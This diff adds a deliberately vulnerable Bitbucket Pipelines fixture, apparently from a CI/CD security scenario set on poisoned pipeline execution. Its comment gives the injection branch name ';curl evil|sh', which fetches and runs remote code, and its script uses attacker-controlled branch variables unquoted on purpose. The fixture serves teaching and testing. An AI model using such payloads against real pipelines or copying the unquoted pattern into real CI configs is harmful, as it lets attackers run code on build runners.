@@ -1,0 +1,22 @@
+# scenarios/62-bitbucket-var-injection
+# CICD-SEC-4 (Poisoned Pipeline Execution) — Bitbucket Pipelines
+#
+# Pattern: an attacker-influenced default variable — `$BITBUCKET_BRANCH`,
+# `$BITBUCKET_PR_DESTINATION_BRANCH`, `$BITBUCKET_TAG` — is used UNQUOTED in a
+# `script:` command. Branch/tag/PR metadata are attacker-controllable, so a
+# branch named `;curl evil|sh` yields command execution on the runner. Same
+# class as CircleCI scenario 56 / GitHub Actions scenario 31.
+#
+# SAFETY: static fixture, nested under scenarios/ (Bitbucket runs only the root
+# bitbucket-pipelines.yml). See README.md.
+
+image: atlassian/default-image@sha256:1d3f5a7c9e2b4d6f8a0c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d0f2a4c6e8b0d2f
+
+pipelines:
+  pull-requests:
+    '**':
+      - step:
+          script:
+            # DANGER — unquoted attacker-controlled SCM metadata in the shell.
+            - echo "Deploying $BITBUCKET_BRANCH"
+            - git log --oneline origin/$BITBUCKET_PR_DESTINATION_BRANCH
